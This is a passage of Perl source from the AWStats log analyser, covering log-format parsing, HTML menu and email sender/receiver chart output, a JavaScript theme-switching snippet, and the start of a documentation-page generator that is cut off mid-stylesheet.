				$i++;
				push @fieldlib, 'method';
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)\\\"";
			}

			elsif ( $f =~ /%virtualnamequot$/ ) {
				$pos_vh = $i;
				$i++;
				push @fieldlib, 'vhost';
				$PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+)\\\"";
			}
			elsif ( $f =~ /%virtualname$/ ) {
				$pos_vh = $i;
				$i++;
				push @fieldlib, 'vhost';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%host_r$/ ) {
				$pos_hostr = $i;
				$i++;
				push @fieldlib, 'hostr';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%host$/ ) {
				$pos_host = $i;
				$i++;
				push @fieldlib, 'host';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%host_proxy$/ ) {
				$pos_host = $i;
				$i++;
				push @fieldlib, 'host';
				$PerlParsingFormat .= "(.+?)(?:, .*)*";
			}
			elsif ( $f =~ /%method$/ ) {
				$pos_method = $i;
				$i++;
				push @fieldlib, 'method';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%url$/ ) {
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%query$/ ) {
				$pos_query = $i;
				$i++;
				push @fieldlib, 'query';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%code$/ ) {
				$pos_code = $i;
				$i++;
				push @fieldlib, 'code';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%bytesd$/ ) {
				$pos_size = $i;
				$i++;
				push @fieldlib, 'size';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%rqtime$/ ) {
				$pos_time = $i;
				$i++;
				push @fieldlib, 'requesttime';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%refererquot$/ ) {
				$pos_referer = $i;
				$i++;
				push @fieldlib, 'referer';
				$PerlParsingFormat .= "\\\"([^\\\"]*)\\\"";
			}
			elsif ( $f =~ /%referer$/ ) {
				$pos_referer = $i;
				$i++;
				push @fieldlib, 'referer';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%uaquot$/ ) {
				$pos_agent = $i;
				$i++;
				push @fieldlib, 'ua';
				$PerlParsingFormat .= "\\\"([^\\\"]*)\\\"";
			}
			elsif ( $f =~ /%uabracket$/ ) {
				$pos_agent = $i;
				$i++;
				push @fieldlib, 'ua';
				$PerlParsingFormat .= "\\\[([^\\\]]*)\\\]";
			}
			elsif ( $f =~ /%ua$/ ) {
				$pos_agent = $i;
				$i++;
				push @fieldlib, 'ua';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%\{Range\}i/ ) {
				$pos_range = $i;
				$i++;
				push @fieldlib, 'range';
				$PerlParsingFormat .= "\\\"([^\\\"]*)\\\"";
			}
			elsif ( $f =~ /%gzipin$/ ) {
				$pos_gzipin = $i;
				$i++;
				push @fieldlib, 'gzipin';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			# Compare $f to /%gzipout/ and not to /%gzipout$/ like other fields
			elsif ( $f =~ /%gzipout/ ) {
				$pos_gzipout = $i;
				$i++;
				push @fieldlib, 'gzipout';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			# Compare $f to /%gzipratio/ and not to /%gzipratio$/ like other fields
			elsif ( $f =~ /%gzipratio/ ) {
				$pos_compratio = $i;
				$i++;
				push @fieldlib, 'gzipratio';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			# Compare $f to /%deflateratio/ and not to /%deflateratio$/ like other fields
			elsif ( $f =~ /%deflateratio/ ) {
				$pos_compratio = $i;
				$i++;
				push @fieldlib, 'deflateratio';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%email_r$/ ) {
				$pos_emailr = $i;
				$i++;
				push @fieldlib, 'email_r';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%email$/ ) {
				$pos_emails = $i;
				$i++;
				push @fieldlib, 'email';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%cluster$/ ) {
				$pos_cluster = $i;
				$i++;
				push @fieldlib, 'clusternb';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			elsif ( $f =~ /%timetaken$/ ) {
				$pos_timetaken = $i;
				$i++;
				push @fieldlib, 'timetaken';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			# Special for protocolmms, used for method if method not already found (for MMS)
			elsif ( $f =~ /%protocolmms$/ ) {
				if ( $pos_method < 0 ) {
					$pos_method = $i;
					$i++;
					push @fieldlib, 'method';
					$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
				}
			}
			# Special for codemms, used for code only if code not already found (for MMS)
			elsif ( $f =~ /%codemms$/ ) {
				if ( $pos_code < 0 ) {
					$pos_code = $i;
					$i++;
					push @fieldlib, 'code';
					$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
				}
			}
			
			elsif ( $f =~ /%extra(\d+)$/ ) {
				$pos_extra[$1] = $i;
				$i++;
				push @fieldlib, "extra$1";
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
			}
			
			elsif ( $f =~ /%other$/ ) {
				$PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
			}

			elsif ( $f =~ /%otherquot$/ ) {
				$PerlParsingFormat .= "\\\"[^\\\"]*\\\"";
			}
			
			else {
				$PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
			}
		}
		if ( !$PerlParsingFormat ) {
			error("No recognized format tag in personalized LogFormat string");
		}
	}
	if ( $pos_host < 0 ) {
		error( "Your personalized LogFormat does not include all fields required by AWStats (Add \%host in your LogFormat string)." );
	}
	if ( $pos_date < 0 ) {
		error( "Your personalized LogFormat does not include all fields required by AWStats (Add \%time1 or \%time2 in your LogFormat string)." );
	}
	if ( $pos_method < 0 ) {
		error( "Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%method in your LogFormat string)." );
	}
	if ( $pos_url < 0 ) {
		error( "Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%url in your LogFormat string)." );
	}
	if ( $pos_code < 0 ) {
		error( "Your personalized LogFormat does not include all fields required by AWStats (Add \%code in your LogFormat string)." );
	}
	$PerlParsingFormat = qr/^$PerlParsingFormat/;
	if ($Debug) { debug(" PerlParsingFormat is $PerlParsingFormat"); }
}

#------------------------------------------------------------------------------
# Function:     Prints a menu category for the frame or static header
# Parameters:   -
# Input:        $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,
#				$NewLinkParams, $NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowMenuCateg {
	my ( $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,
		$NewLinkParams, $NewLinkTarget )
	  = ( shift, shift, shift, shift, shift, shift, shift, shift );
	$categicon = '';    # Comment this to enabme category icons
	my ( $menu, $menulink, $menutext ) = ( shift, shift, shift );
	my $linetitle = 0;

	# Call to plugins' function AddHTMLMenuLink
	foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuLink'} } ) {

	# my $function="AddHTMLMenuLink_$pluginname('$categ',\$menu,\$menulink,\$menutext)";
	# eval("$function");
		my $function = "AddHTMLMenuLink_$pluginname";
		&$function( $categ, $menu, $menulink, $menutext );
	}
	foreach my $key (%$menu) {
		if ( $menu->{$key} && $menu->{$key} > 0 ) { $linetitle++; last; }
	}
	if ( !$linetitle ) { return; }

	# At least one entry in menu for this category, we can show category and entries
	my $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );
	print "<tr><td class=\"awsm\" width=\"$WIDTHMENU1\""
	  . ( $frame ? "" : " valign=\"top\"" ) . ">"
	  . "<b>$categtext:</b></td>\n";
	print( $frame? "</tr>\n" : "<td class=\"awsm\">" );
	foreach my $key ( sort { $menu->{$a} <=> $menu->{$b} } keys %$menu ) {
		if ( $menu->{$key} == 0 )     { next; }
		if ( $menulink->{$key} == 1 ) {
			print( $frame? "<tr><td class=\"awsm\">" : "" );
			print "<a href=\"$linkanchor#$key\"$targetpage>$menutext->{$key}</a>";
			print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
		}
		if ( $menulink->{$key} == 2 ) {
			print( $frame? "<tr><td class=\"awsm\">" : "" );
			print "<a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=$key")
				: "$StaticLinks.$key.$StaticExt"
			  )
			  . "\"$NewLinkTarget>$menutext->{$key}</a>";
			print( $frame? "</td>\n</tr>\n" : " &nbsp; " );
		}
	}
	print( $frame? "" : "</td>\n</tr>\n" );
}

#------------------------------------------------------------------------------
# Function:     Prints HTML to display an email senders chart
# Parameters:   -
# Input:        $NewLinkParams, NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowEmailSendersChart {
	my $NewLinkParams         = shift;
	my $NewLinkTarget         = shift;
	my $MaxLengthOfShownEMail = 48;

	my $total_p;
	my $total_h;
	my $total_k;
	my $max_p;
	my $max_h;
	my $max_k;
	my $rest_p;
	my $rest_h;
	my $rest_k;

	# Show filter form
	#&ShowFormFilter("emailsfilter",$EmailsFilter);
	# Show emails list

	print "$Center<a name=\"emailsenders\">&nbsp;</a>";
	my $title;
	if ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {
		$title = _t("Email Senders");
	}
	else {
		$title = _t("Email Senders") . " (" . _t("Top") . " $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=allemails")
			: "$StaticLinks.allemails.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
		if ( $ShowEMailSenders =~ /L/i ) {
			$title .= " &nbsp; - &nbsp; <a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=lastemails")
				: "$StaticLinks.lastemails.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Last") . "</a>";
		}
	}
	&tab_head( "$title", 19, 0, 'emailsenders' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">" . _t("Email Senders") . " : "
	  . ( scalar keys %_emails_h ) . "</th>\n";
	if ( $ShowEMailSenders =~ /H/i ) {
		print "<th rowspan=\"2\" bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowEMailSenders =~ /B/i ) {
		print "<th class=\"datasize\" rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowEMailSenders =~ /M/i ) {
		print "<th rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>\n";
	}
	if ( $ShowEMailSenders =~ /L/i ) {
		print "<th rowspan=\"2\" width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"30%\">Local</th><th>&nbsp;</th><th width=\"30%\">External</th></tr>\n";
	$total_p = $total_h = $total_k = 0;
	$max_h = 1;
	foreach ( values %_emails_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	$max_k = 1;
	foreach ( values %_emails_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	if ( !$HTMLOutput{'allemails'} && !$HTMLOutput{'lastemails'} ) {
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_h );
	}
	if ( $HTMLOutput{'allemails'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_h );
	}
	if ( $HTMLOutput{'lastemails'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emails_h,
			\%_emails_l );
	}
	foreach my $key (@keylist) {
		my $newkey = $key;
		if ( length($key) > $MaxLengthOfShownEMail ) {
			$newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . "...";
		}
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_h = int( $BarWidth * $_emails_h{$key} / $max_h ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $BarWidth * $_emails_k{$key} / $max_k ) + 1;
		}
		print "<tr>";
		my $direction = IsLocalEMail($key);

		if ( $direction > 0 ) {
			print "<td class=\"aws\">$newkey</td><td>-&gt;</td><td>&nbsp;</td>\n";
		}
		if ( $direction == 0 ) {
			print "<td colspan=\"3\"><span style=\"color: #$color_other\">$newkey</span></td>\n";
		}
		if ( $direction < 0 ) {
			print "<td class=\"aws\">&nbsp;</td><td>&lt;-</td><td>$newkey</td>\n";
		}
		if ( $ShowEMailSenders =~ /H/i ) { print "<td>$_emails_h{$key}</td>\n"; }
		if ( $ShowEMailSenders =~ /B/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emails_k{$key} ) . "</td>\n";
		}
		if ( $ShowEMailSenders =~ /M/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emails_k{$key} / ( $_emails_h{$key} || 1 ) )
			  . "</td>\n";
		}
		if ( $ShowEMailSenders =~ /L/i ) {
			print "<td nowrap=\"nowrap\">"
			  . ( $_emails_l{$key} ? Format_Date( $_emails_l{$key}, 1 ) : '-' )
			  . "</td>\n";
		}
		print "</tr>\n";

		#$total_p += $_emails_p{$key};
		$total_h += $_emails_h{$key};
		$total_k += $_emails_k{$key};
		$count++;
	}
	$rest_p = 0;                        
	# $rest_p=$TotalPages-$total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	# All other sender emails
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) { 
		print "<tr><td colspan=\"3\"><span style=\"color: #$color_other\">" . _t("Others (email senders)") . "</span></td>\n";
		if ( $ShowEMailSenders =~ /H/i ) { print "<td>$rest_h</td>\n"; }
		if ( $ShowEMailSenders =~ /B/i ) { print "<td nowrap=\"nowrap\">" . Format_Bytes($rest_k) . "</td>\n"; }
		if ( $ShowEMailSenders =~ /M/i ) { print "<td nowrap=\"nowrap\">" . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . "</td>\n"; }
		if ( $ShowEMailSenders =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints HTML to display an email receivers chart
# Parameters:   -
# Input:        $NewLinkParams, NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowEmailReceiversChart {
	my $NewLinkParams         = shift;
	my $NewLinkTarget         = shift;
	my $MaxLengthOfShownEMail = 48;

	my $total_p;
	my $total_h;
	my $total_k;
	my $max_p;
	my $max_h;
	my $max_k;
	my $rest_p;
	my $rest_h;
	my $rest_k;

	# Show filter form
	#&ShowFormFilter("emailrfilter",$EmailrFilter);
	# Show emails list

	print "$Center<a name=\"emailreceivers\">&nbsp;</a>";
	my $title;
	if ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {
		$title = _t("Email Receivers");
	}
	else {
		$title = _t("Email Receivers") . " (" . _t("Top") 
		  . " $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=allemailr")
			: "$StaticLinks.allemailr.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
		if ( $ShowEMailReceivers =~ /L/i ) {
			$title .= " &nbsp; - &nbsp; <a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=lastemailr")
				: "$StaticLinks.lastemailr.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Last") . "</a>";
		}
	}
	&tab_head( "$title", 19, 0, 'emailreceivers' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">" . _t("Email Receivers") . " : "
	  . ( scalar keys %_emailr_h ) . "</th>\n";
	if ( $ShowEMailReceivers =~ /H/i ) {
		print "<th rowspan=\"2\" bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowEMailReceivers =~ /B/i ) {
		print "<th class=\"datasize\" rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowEMailReceivers =~ /M/i ) {
		print "<th rowspan=\"2\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>\n";
	}
	if ( $ShowEMailReceivers =~ /L/i ) {
		print "<th rowspan=\"2\" width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"30%\">Local</th><th>&nbsp;</th><th width=\"30%\">External</th></tr>\n";
	$total_p = $total_h = $total_k = 0;
	$max_h = 1;
	foreach ( values %_emailr_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	$max_k = 1;
	foreach ( values %_emailr_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	if ( !$HTMLOutput{'allemailr'} && !$HTMLOutput{'lastemailr'} ) {
		&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h, \%_emailr_h );
	}
	if ( $HTMLOutput{'allemailr'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h, \%_emailr_h );
	}
	if ( $HTMLOutput{'lastemailr'} ) {
		&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \%_emailr_h, \%_emailr_l );
	}
	foreach my $key (@keylist) {
		my $newkey = $key;
		if ( length($key) > $MaxLengthOfShownEMail ) {
			my $display_len = $MaxLengthOfShownEMail - 3;
			my $truncated = substr( $key, 0, $display_len ) . "...";
			$newkey = qq{<span title="$key">$truncated</span>};
		}
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_h = int( $BarWidth * $_emailr_h{$key} / $max_h ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $BarWidth * $_emailr_k{$key} / $max_k ) + 1;
		}
		print "<tr>";
		my $direction = IsLocalEMail($key);

		if ( $direction > 0 ) {
			print "<td class=\"aws\">$newkey</td><td>&lt;-</td><td>&nbsp;</td>\n";
		}
		if ( $direction == 0 ) {
			print "<td colspan=\"3\"><span style=\"color: #$color_other\">$newkey</span></td>\n";
		}
		if ( $direction < 0 ) {
			print "<td class=\"aws\">&nbsp;</td><td>-&gt;</td><td>$newkey</td>\n";
		}
		if ( $ShowEMailReceivers =~ /H/i ) {
			print "<td>$_emailr_h{$key}</td>\n";
		}
		if ( $ShowEMailReceivers =~ /B/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emailr_k{$key} ) . "</td>\n";
		}
		if ( $ShowEMailReceivers =~ /M/i ) {
			print "<td nowrap=\"nowrap\">"
			  . Format_Bytes( $_emailr_k{$key} / ( $_emailr_h{$key} || 1 ) )
			  . "</td>\n";
		}
		if ( $ShowEMailReceivers =~ /L/i ) {
			print "<td nowrap=\"nowrap\">"
			  . ( $_emailr_l{$key} ? Format_Date( $_emailr_l{$key}, 1 ) : '-' )
			  . "</td>\n";
		}
		print "</tr>\n";
		
		#$total_p += $_emailr_p{$key};
		$total_h += $_emailr_h{$key};
		$total_k += $_emailr_k{$key};
		$count++;
	}
	$rest_p = 0;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) {
		print "<tr><td colspan=\"3\"><span style=\"color: #$color_other\">" . _t("Others (email receivers)") . "</span></td>\n";
		if ( $ShowEMailReceivers =~ /H/i ) { print "<td>$rest_h</td>\n"; }
		if ( $ShowEMailReceivers =~ /B/i ) { print "<td nowrap=\"nowrap\">" . Format_Bytes($rest_k) . "</td>\n"; }
		if ( $ShowEMailReceivers =~ /M/i ) { print "<td nowrap=\"nowrap\">" . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . "</td>\n"; }
		if ( $ShowEMailReceivers =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:    返回主题切换的JavaScript代码
# Description: 生成用于主题管理的JavaScript脚本，实现以下功能：
#              - 从 localStorage 读取保存的主题并应用
#              - 监听其他页面的主题变化（storage事件）并同步
#              - 监听 iframe 消息（postMessage）并同步
#              - 自动向 nav 和 stats 框架广播主题变化
# 
# Return:      HTML script 标签包裹的JavaScript代码
# Notes:       此函数会被所有文档页面引入，确保整个应用主题统一
#------------------------------------------------------------------------------
sub get_theme_script {
	return <<'END_SCRIPT';
<script>
(function() {
	const savedTheme = localStorage.getItem('awstats-theme');
	const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
	const activeTheme = savedTheme || (prefersDark ? 'dark' : 'light');
	
	if (activeTheme === 'dark') {
		document.documentElement.setAttribute('data-theme', 'dark');
	} else {
		document.documentElement.removeAttribute('data-theme');
	}
	
	function broadcastTheme(theme) {
		const targetFrames = ['nav', 'stats', 'mainleft', 'mainright'];
		targetFrames.forEach(frameName => {
			try {
				const frame = document.getElementsByName(frameName)[0] || document.getElementById(frameName);
				if (frame && frame.contentWindow) {
					frame.contentWindow.postMessage({ theme: theme }, '*');
				}
			} catch (err) {
			}
		});
	}

	window.addEventListener('storage', function(e) {
		if (e.key === 'awstats-theme' && e.newValue) {
			document.documentElement.setAttribute('data-theme', e.newValue);
			broadcastTheme(e.newValue);
		}
	});
	
	window.addEventListener('message', function(e) {
		if (e.data && e.data.theme) {
			document.documentElement.setAttribute('data-theme', e.data.theme);
			if (window.top === window.self) {
				broadcastTheme(e.data.theme);
			}
		}
	});
})();
</script>
END_SCRIPT
}

#------------------------------------------------------------------------------
# 生成 what 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_what_doc {
	my ($dir) = @_;
	
	my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = sprintf( _t("sponsor.section"), $StatsUrl );
	my $theme_script = get_theme_script();
	my $full_title = _t("docs.what.subtitle") . " - " . "$page_title";
	my $doc_title = _t("docs.what.subtitle");
	my $content = _t("docs.what.content");
	   $content =~ s/\\n/\n/g;
	my $compare_link = _t("docs.what.compare.link");
	my $doc_dir = "$dir/docs"; 
	my $lang = $Lang || 'en-us';
	my $dir_attr = $PageDir ? 'rtl' : 'ltr';
	
	my $html = <<"END_HTML";
	<title>$full_title</title>
	<style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--section-location:#3b82f6;--section-hooks:#10b981;--section-variables:#f59e0b;--section-accessible:#8b5cf6;--section-functions:#ec4899}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--section-location:#60a5fa;--section-hooks:#34d399;--section-variables:#fbbf24;--section-accessible:#a78bfa;--section-functions:#f472b6}.what-content{max-width:1200px;margin:0 auto;padding:20px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;line-height:1.6;color:var(--text-color);background-color:var(--bg-color)}body{margin:0;padding:0;background-color:var(--bg-color);color:var(--text-color);transition:background-color 0.3s,color 0.3s}.page-header{text-align:center;margin-bottom:40px;padding-bottom:20px;border-bottom:2px solid var(--border-color)}.page-header h1{font-size:2.5rem;color:var(--text-color);margin-bottom:10px}.page-header .subtitle{font-size:1.2rem;color:var(--text-color);opacity:0.7}h2{font-size:1.8rem;color:var(--text-color);margin:40px 0 20px;padding-bottom:10px;border-bottom:2px solid var(--section-location);display:inline-block}.intro-section{margin-bottom:40px}.intro-box{background:var(--card-bg);padding:30px;border-radius:12px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border-left:5px solid var(--section-location);font-size:1.1rem;border:1px solid var(--border-color)}.intro-box p{margin:15px 0;color:var(--text-color)}.intro-box u{text-decoration:none;font-weight:600;color:var(--section-location)}.intro-box b{color:var(--text-color)}.history-section{margin-bottom:40px}.history-box{background:var(--card-bg);padding:25px;border-radius:12px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border:1px solid var(--border-color)}.history-box a{color:var(--link-color);text-decoration:none;font-weight:500}.history-box a:hover{text-decoration:underline}.features-section{margin-bottom:40px}.features-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:25px;margin-top:30px}.feature-item{background:var(--card-bg);border-radius:12px;padding:25px 20px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border:1px solid var(--border-color);transition:transform 0.2s,box-shadow 0.2s}.feature-item:hover{transform:translateY(-3px);box-shadow:0 10px 20px rgba(0,0,0,0.1);border-color:var(--section-location)}.feature-icon{font-size:2.5rem;margin-bottom:15px;text-align:center}.feature-item h4{font-size:1.3rem;color:var(--text-color);margin:0 0 15px;text-align:center;border-bottom:2px solid var(--border-color);padding-bottom:10px}.feature-item ul{list-style:none;padding:0;margin:0}.feature-item li{padding:8px 0;border-bottom:1px dashed var(--border-color);color:var(--text-color);opacity:0.9}.feature-item li:last-child{border-bottom:none}.feature-item u{text-decoration:none;font-weight:600;color:var(--section-location);background:var(--code-bg);padding:2px 6px;border-radius:4px;font-size:0.9rem}.requirements-section{margin-bottom:40px}.requirements-box{background:var(--card-bg);padding:30px;border-radius:12px;border:1px solid var(--border-color)}.requirements-box h4{font-size:1.3rem;color:var(--text-color);margin:25px 0 15px}.requirements-box h4:first-of-type{margin-top:0}.requirements-box ul{list-style:none;padding:0;display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px}.requirements-box li{padding:8px 15px;background:var(--code-bg);border-radius:30px;border:1px solid var(--border-color);font-size:0.95rem;color:var(--text-color)}.requirements-box .note{margin-top:25px;padding:15px 20px;background:var(--code-bg);border-left:5px solid var(--section-variables);border-radius:8px;color:var(--text-color)}.compare-section{margin-bottom:40px;overflow-x:auto}.compare-table{width:100%;border-collapse:collapse;background:var(--card-bg);border-radius:12px;overflow:hidden;box-shadow:0 4px 6px rgba(0,0,0,0.05);margin:20px 0}.compare-table th{background:var(--header-bg);color:var(--text-color);padding:15px;text-align:left;font-weight:600;border-bottom:2px solid var(--section-location)}.compare-table td{padding:12px 15px;border-bottom:1px solid var(--border-color);color:var(--text-color)}.compare-table tr:last-child td{border-bottom:none}.compare-table tr:nth-child(even){background:var(--code-bg)}.compare-table td:first-child{font-weight:600;color:var(--text-color);background:var(--header-bg)}.compare-table .table-note{margin-top:15px;padding:10px 15px;background:var(--code-bg);border-radius:8px;color:var(--text-color);font-style:italic;border-left:3px solid var(--section-hooks)}.scenarios-section{margin-bottom:40px}.scenarios-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:25px;margin-top:30px}.scenario-card{background:var(--card-bg);border-radius:12px;padding:25px;box-shadow:0 4px 6px rgba(0,0,0,0.05);border:1px solid var(--border-color);transition:all 0.3s}.scenario-card:hover{border-color:var(--section-location);box-shadow:0 10px 20px rgba(59,130,246,0.1)}.scenario-icon{font-size:2.5rem;margin-bottom:15px}.scenario-card h3{font-size:1.3rem;color:var(--text-color);margin:0 0 15px;padding-bottom:10px;border-bottom:2px solid var(--border-color)}.scenario-card p{color:var(--text-color);opacity:0.9;margin:0;line-height:1.6}.more-section{margin:50px 0 30px}.more-links{display:flex;flex-wrap:wrap;gap:15px;justify-content:center;margin-top:25px}.more-link{display:inline-flex;align-items:center;padding:12px 25px;background:var(--card-bg);border:1px solid var(--border-color);border-radius:40px;color:var(--text-color);text-decoration:none;transition:all 0.2s;font-weight:500}.more-link:hover{background:var(--section-location);border-color:var(--section-location);color:#ffffff;transform:translateY(-2px);box-shadow:0 5px 15px rgba(59,130,246,0.3)}.more-icon{font-size:1.2rem;margin-right:8px}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}\@media (max-width:768px){.page-header h1{font-size:2rem}.page-header .subtitle{font-size:1rem}h2{font-size:1.5rem}.features-grid{grid-template-columns:1fr}.requirements-box 